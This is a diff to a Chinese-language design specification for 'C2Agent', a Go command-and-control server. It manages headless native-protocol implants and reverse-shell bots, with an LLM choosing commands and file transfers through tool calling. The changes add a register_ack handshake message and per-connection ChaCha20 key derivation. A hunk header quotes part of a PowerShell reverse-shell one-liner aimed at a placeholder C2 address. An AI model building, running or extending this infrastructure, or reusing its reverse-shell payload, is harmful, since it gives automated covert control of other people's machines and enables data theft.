@@ -1,9 +1,9 @@
 # C2Agent 系统设计文档
 
-> 状态：**v1.0 已定稿（审核通过 2026-09-26）**
+> 状态：**已定稿**
 > 范围：以 **Go** 编写的控制端（C2），同时支持两类受控端：
-> **A. 原生协议 Agent**（复用 `remote/remote-c`、`remote/remote-py`）与
-> **B. 反弹 Shell Bot**（沿用 demo `Infection` 的裸 shell 直连方案）。
+> **A. 原生协议 Agent**（`remote/remote-c`、`remote/remote-go`、`remote/remote-py`）与
+> **B. 反弹 Shell Bot**（裸 shell 直连）。
 > 两类受控端**独立配置、独立监听、并存运行**，用户按实际情况选择。
 
 ---
@@ -21,17 +21,17 @@
 | v0.7 | 2026-09-26 | 统一两类受控端下载落盘逻辑：一律 `dl_temp_dir/<basename(srcPath)>`，**重名覆盖**，失败删半成品 |
 | v1.0 | 2026-09-26 | 16 项审核点全部确认，设计**定稿**，进入编码 |
 | v1.1 | 2026-10-09 | 加密升级：Native 链路的 ChaCha20 key+nonce 改为**由握手 nonce 逐连接派生**（一次一密），双向以 `dir` 标记隔离；握手报文格式不变、硬切不保留旧静态方案（§5.2 / §11.3）|
+| v1.2 | 2026-11-20 | 注册 ACK：C2 在 `register_confirm` 后回 `register_ack(0x87)`，下发 `heartbeat_interval_sec` / `cmd_timeout`；受控端删除本地配置/CLI 中的这两项，改为握手后带锁实时替换运行时参数。心跳基准取 `native.heartbeat_timeout_sec`，受控端间隔为 `ceil(2/3 × 基准)`（§5.2 / §7.1）|
 
 ---
 
 ## 1. 设计目标
 
-将两版 Python 实验（二进制协议 + 反弹 Shell）统一到一个
-**Go 控制端**中，实现：
+系统由 **Go 控制端**与两类受控端组成，实现：
 
-1. **控制端 Go 化**：单一 Go 二进制，跨平台（Windows/Linux/macOS），性能与部署优于 Python。
+1. **控制端**：单一 Go 二进制，跨平台（Windows/Linux/macOS），部署简单。
 2. **双受控端并存**：同一 C2 进程可同时监听
-   - 原生协议端口（对接 `remote-c` / `remote-py`，二进制协议 + ChaCha20 加密）；
+   - 原生协议端口（对接 `remote-c` / `remote-go` / `remote-py`，二进制协议 + ChaCha20 加密）；
    - 反弹 Shell 端口（对接裸 shell，明文行协议 + marker 定界）。
    两类 Agent 进入同一注册表，对上层会话/UI 呈现一致的操作体验，但**连接配置相互独立**。
 3. **LLM 驱动**：通过 OpenAI 兼容 API 的 **原生 Tool / Function Calling** 让模型决策并下发动作，
@@ -41,20 +41,20 @@
 5. **队列超时语义**：指令在队列中**排队等待不受超时限制**；**开始执行后才受 `cmd_timeout` 限制**。
 6. **CLI + Web 双模式**：交互式 CLI 与浏览器 Web 面板（HTTP + SSE + `go:embed` 内嵌前端；多会话标签、流式对话、会话管理、文件管理器、授权弹窗、Agent 切换）。
    LLM 调用统一使用官方库 **`github.com/openai/openai-go`**。
-7. **复用为主、微小改动**：现有 `remote/` 受控端的**协议报文格式、编解码、调度等主流程保持不变**（Go C2 逐字节兼容）；
-   允许常量/参数级微调（如 `READ_FILE_LIMIT = 51200`）。**例外**：按 v1.1，握手流程与 ChaCha20 的 key/nonce
-   派生统一升级为「一次一密」（见 §5.2），控制端与三个受控端同步硬切，不保留旧版兼容。
+7. **协议一致**：`remote/` 受控端的**协议报文格式、编解码、调度等主流程**与控制端逐字节兼容；
+   允许常量/参数级微调（如 `READ_FILE_LIMIT = 51200`）。Native 握手与 ChaCha20 的 key/nonce
+   采用逐连接派生（一次一密，见 §5.2），控制端与三个受控端保持一致。
 
-**非目标（本期）**：不提供受控端本地 UI（受控端永远无头）；不做生产级抗审查。
+**非目标**：不提供受控端本地 UI（受控端永远无头）；不做生产级抗审查。
 
 ### 1.1 技术选型
 
 | 领域 | 选型 | 说明 |
 | ---- | ---- | ---- |
-| 语言 | **Go 1.22+** | 控制端单一二进制；受控端复用现有 C/Python |
+| 语言 | **Go 1.22+** | 控制端单一二进制；受控端为 C / Go / Python |
 | LLM SDK | **`github.com/openai/openai-go`（官方库）** | 流式 chat completions + tools；`option.WithBaseURL` 兼容任意 OpenAI 兼容端点 |
 | Web 前端 | **net/http + SSE + `go:embed`** | 纯 Go、零 CGO；浏览器访问，可 `CGO_ENABLED=0` 交叉编译 |
-| 二进制协议 | 自实现（`internal/protocol` + `internal/crypto`） | 与 `remote/` 逐字节兼容 |
+| 二进制协议 | 自实现（`internal/protocol` + `internal/crypto`） | 与 `remote/` 受控端逐字节兼容 |
 | CLI | 标准库 `flag` + `bufio` | 无额外依赖 |
 
 > **交叉编译约束**：全部依赖纯 Go、**不引入 CGO**。使用
@@ -247,13 +247,13 @@ C2Agent/
     └── build_all.bat
 ```
 
-> Go module 名暂定 `c2agent`；如需发布可改为 `github.com/<user>/c2agent`。
+> Go module 名为 `c2agent`；如需发布可改为 `github.com/<user>/c2agent`。
 
 ---
 
-## 5. 受控端 A：原生协议 Agent（复用 `remote/`）
+## 5. 受控端 A：原生协议 Agent（`remote/`）
 
-### 5.1 二进制协议（与现有实现**逐字节兼容**）
+### 5.1 二进制协议（与 `remote/` 受控端**逐字节兼容**）
 
 **包头（固定 16 字节）**
 
@@ -301,6 +301,7 @@ C2Agent/
 | 0x84 | 双向 | disconnect | `reason` |
 | 0x85 | C2→Agent | shutdown | `reason` |
 | 0x86 | Agent→C2 | register_confirm | `agent_id`,`hostname`,`os`（已加密） |
+| 0x87 | C2→Agent | register_ack | `heartbeat_interval_sec`,`cmd_timeout`（已加密） |
 
 - `read_file` 整文件读取截断至 **51200 字符**（50 KiB）；行范围最多 **512 行**。该限制在受控端强制：
   `remote/remote-c`（`agent.h` 的 `READ_FILE_LIMIT`）与 `remote/remote-py`
@@ -310,7 +311,7 @@ C2Agent/
 - 数据包 `DATA_CHUNK_SIZE = 1024`，`end_flag`：0=续传，1=末包。
 - 单个包体上限 **32 MiB**（`MaxBodyLen`）；超限视为协议异常并断开连接（防御畸形 `body_len`）。
 
-### 5.2 注册握手与加密（复用现有语义）
+### 5.2 注册握手与加密
 
 ```
 Agent                                C2(Go)
@@ -318,7 +319,9 @@ Agent                                C2(Go)
   │◀─ register_response(req=1,digest)─│  digest = sha256(nonce+token)
   │  本地校验 sha256(nonce+token)==digest? 否则断开
   │── register_confirm(req=2, ───────►│  ★已用 ChaCha20 加密（Agent→C2 第一段）
-  │   agent_id,hostname,os)           │  → Registry.Register
+  │   agent_id,hostname,os)           │
+  │◀─ register_ack(req=0, ────────────│  ★已加密（C2→Agent 第一段）
+  │   hb_interval,cmd_timeout)        │  → Registry.Register
   │═══ 此后全字节流 ChaCha20 加密 ════│
 ```
 
@@ -327,10 +330,13 @@ Agent                                C2(Go)
   - `nonce(dir) = SHA-256(token ‖ nonce ‖ token ‖ dir)[0:12]`（12 字节，截取）。
   - `dir` 为方向标记（`0x01`=C2→Agent，`0x02`=Agent→C2），保证双向不共用密钥流。
   - 握手 nonce 每连接随机，故**每条连接使用唯一的一组 key+nonce（一次一密）**。
-- 加密作用于**整条字节流**（含包头/包身/数据包），接收端先解密再分帧；counter 沿用现有连续自增设计。
-- `register` / `register_response` 明文；`register_confirm` 起（含）加密。
+- 加密作用于**整条字节流**（含包头/包身/数据包），接收端先解密再分帧；counter 在连接内连续自增。
+- `register` / `register_response` 明文；`register_confirm` 与 `register_ack` 起（含）加密。
+- `register_ack` 的 TLV 固定为 `[heartbeat_interval_sec, cmd_timeout]`：`cmd_timeout` 直接取
+  `policy.cmd_timeout`；`heartbeat_interval_sec = ceil(2/3 × native.heartbeat_timeout_sec)`。
+  受控端收到后在锁保护下替换运行时参数：命令在下一次执行、心跳在下一次周期读取新值。
 - C2 侧 Go 需实现 `EncryptedConn`：包装 `net.Conn` 的 `Read`/`Write` 做流式加解密，
-  并在 `_wait_confirm` 阶段复用同一个 rx 上下文（处理 confirm 与首个加密包 TCP 合并到达）。
+  并在 `_wait_confirm` 阶段使用同一个 rx 上下文（处理 confirm 与首个加密包 TCP 合并到达）。
 
 ### 5.3 文件传输
 
@@ -400,7 +406,7 @@ shell -> C2:      <交互式回显，若有>
 
 ### 6.3 动作 → Shell 命令（按 OS）
 
-与 Infection 一致：所有 LLM 动作转为**单条 shell 命令**。
+所有 LLM 动作转为**单条 shell 命令**。
 
 - `get_cwd`：`pwd` / `powershell "(Get-Location).Path"`
 - `list_dir`：`ls -la` / PowerShell `Get-ChildItem` 表格
@@ -893,7 +899,8 @@ if err := stream.Err(); err != nil { /* 网络 / 接口错误 */ }
 
 - **server.go**：`net.Listen` → accept loop；每连接：
   1. 读 `register`（仅 nonce）→ 回 `register_response`；
-  2. 建 ChaCha20 上下文 → 读 `register_confirm`（解密）→ `Registry.Register`；
+  2. 建 ChaCha20 上下文 → 读 `register_confirm`（解密）→ 回 `register_ack`（加密，下发
+     `heartbeat_interval_sec` / `cmd_timeout`）→ `Registry.Register`；
   3. 启动读循环，分发：心跳、disconnect、数据包路由、pending 响应。
   4. watchdog：`active_ops==0` 且心跳超时的 Agent 断开并移除。
 - **backend.go**：`forward`（注册 future、写包、等响应、超时→NetworkError）；
@@ -944,7 +951,7 @@ if err := stream.Err(); err != nil { /* 网络 / 接口错误 */ }
   - `GET /api/files/download`、`POST /api/files/upload`
 - SSE 事件均携带 `agent` 与 `session` 字段，前端按当前会话过滤。
 - 前端 `ui/`：左侧 Agent 列表、会话标签页（多会话切换/新建/关闭）、聊天区（Markdown / 终端风格）、
-  授权弹窗、文件管理器、主题切换、授权模式滑动选择；**零构建**（原生 HTML/JS，移植既有控制台风格）。
+  授权弹窗、文件管理器、主题切换、授权模式滑动选择；**零构建**（原生 HTML/JS 控制台风格）。
 - 上传：浏览器字节流式缓冲到 `ul_temp_dir`（uuid 唯一名）→ 传输 → 删除临时文件。
 - 下载：两类受控端统一落到 `dl_temp_dir/<basename>`（重名覆盖）→ `http.ServeContent` 回传浏览器（临时文件保留）。
 - 文件路径按 active Agent 的 OS 归一化（Windows 驱动器根处理）。
@@ -1042,6 +1049,9 @@ if err := stream.Err(); err != nil { /* 网络 / 接口错误 */ }
 - `fileserver`：独立、无鉴权的静态文件服务器；`path` 空 = 程序同目录 `fileserver`（不存在则创建），显式路径必须存在且为目录；配置非法时仅记录错误并禁用该功能，不影响其他组件。
 - `native` 与 `shell` 各自 `enabled` / 监听地址 / 端口，**相互独立**；可只启用其一。
 - Native 必填 `auth_token`（与 `remote` 端 `--auth-token` 一致）；Shell 无鉴权。
+- `native.heartbeat_timeout_sec` 同时作为下发给受控端的心跳基准：实际下发值为
+  `heartbeat_interval_sec = ceil(2/3 × heartbeat_timeout_sec)`；它仍是 C2 watchdog 的超时判定值。
+- `native.heartbeat_timeout_sec` 与 `policy.cmd_timeout` 的取值范围为 **1–600 秒**；ACK 下发值同样受该上限约束。
 - `policy.auth_mode`：0=N-Auto / 1=H-Auto / 2=F-Auto。
 - `policy.timeout_action`：执行超时后的处理，`disconnect`（默认，断开该 Agent）或
   `fail`（仅失败当前会话 Job，继续队列）。**排队等待始终不超时**。
@@ -1135,7 +1145,7 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 
 ---
 
-## 17. 审核结论（已确认 · 2026-09-26）
+## 17. 设计确认
 
 | # | 审核点 | 确认结论 |
 | - | ------ | -------- |
@@ -1143,18 +1153,18 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 | 2 | Native 兼容性 | ✅ **完全逐字节兼容**，仅允许变量/参数级微调（如 `READ_FILE_LIMIT=51200`） |
 | 3 | 加密算法 | ✅ **ChaCha20 自实现**（无三方依赖） |
 | 4 | LLM 指令机制 | ✅ **原生 Tool / Function Calling** |
-| 5 | 授权与轮数 | ✅ **沿用现有设计**（三级 `auth_mode` + 授权通过重置轮数） |
+| 5 | 授权与轮数 | ✅ **三级 `auth_mode` + 授权通过重置轮数** |
 | 6 | Shell Bot 鉴权 | ✅ **不鉴权**（连接即在线） |
 | 7 | Web 框架 | ✅ **仅用标准库**（`net/http` + `go:embed`） |
-| 8 | 前端形态 | ✅ **保持现有设计**（单页 `index.html`，原生 HTML/JS，零构建） |
+| 8 | 前端形态 | ✅ **单页 `index.html`，原生 HTML/JS，零构建** |
 | 9 | 项目 / module 命名 | ✅ **`c2agent`** |
 | 10 | 配置结构 | ✅ **保持分区设计**（`llm/web/native/shell/policy/transfer`） |
-| 11 | 多会话模型 | ✅ 遵循建议：每 Agent 多会话，独立历史/轮数/授权 |
-| 12 | 队列超时语义 | ✅ 遵循建议：排队不超时；执行中 `cmd_timeout`；超时默认断开 Agent |
-| 13 | 调度公平性 | ✅ 遵循建议：严格 FIFO（先入先执行） |
-| 14 | 直连命令 / 文件操作 | ✅ 遵循建议：走同一 Agent 队列串行 |
-| 15 | LLM 库 | ✅ 遵循建议：`github.com/openai/openai-go` 官方库 |
-| 16 | 交叉编译 | ✅ 遵循建议：全依赖纯 Go、`CGO_ENABLED=0` 交叉编译 |
+| 11 | 多会话模型 | ✅ 每 Agent 多会话，独立历史/轮数/授权 |
+| 12 | 队列超时语义 | ✅ 排队不超时；执行中 `cmd_timeout`；超时默认断开 Agent |
+| 13 | 调度公平性 | ✅ 严格 FIFO（先入先执行） |
+| 14 | 直连命令 / 文件操作 | ✅ 走同一 Agent 队列串行 |
+| 15 | LLM 库 | ✅ `github.com/openai/openai-go` 官方库 |
+| 16 | 交叉编译 | ✅ 全依赖纯 Go、`CGO_ENABLED=0` 交叉编译 |
 
 ---
 
